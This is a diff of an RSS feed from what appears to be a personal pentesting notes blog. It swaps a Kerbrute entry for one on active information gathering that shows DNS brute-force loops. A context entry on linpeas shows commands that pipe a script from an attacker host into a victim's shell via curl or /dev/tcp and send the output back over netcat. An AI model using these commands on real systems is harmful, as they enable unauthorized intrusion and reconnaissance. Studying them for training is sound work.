@@ -16,15 +16,6 @@
     </item>
     
     <item>
-      <title>Kerbrute Enumeration</title>
-      <link>https://kdbed.github.io/posts/kerbrute_enumeration/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://kdbed.github.io/posts/kerbrute_enumeration/</guid>
-      <description>Kerbrute Enumeration </description>
-    </item>
-    
-    <item>
       <title>linpeas</title>
       <link>https://kdbed.github.io/posts/linpeas/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -33,6 +24,17 @@
       <description>See carlospolop : PEASS-ng hacktricks
 Execution: Run from memory and send back to attacker:
 # Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
+    </item>
+    
+    <item>
+      <title>Pentest - Active Information Gathering</title>
+      <link>https://kdbed.github.io/posts/pentest_active_information_gathering/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/pentest_active_information_gathering/</guid>
+      <description>Active Information Gathering DNS DNS - Basics DNS Enumeration - Basics DNS forward lookup brute-forcing to determine additional IPs belonging to a domain:
+1 for ip in $(cat list.txt); do host $ip.domain.com; done Comprehensive lists available at SecLists. Based on IPs determined from the above, we can perform reverse lookups by scanning an associated range:
+1 for ip in $(seq 200 254); do host xxx.xxx.xxx.$ip; done | grep -v &amp;#34;not found&amp;#34; dnsrecon dnsenum2 nslookup TCP/UDP Port Scanning Simple port scan with Netcat:</description>
     </item>
     
     <item>
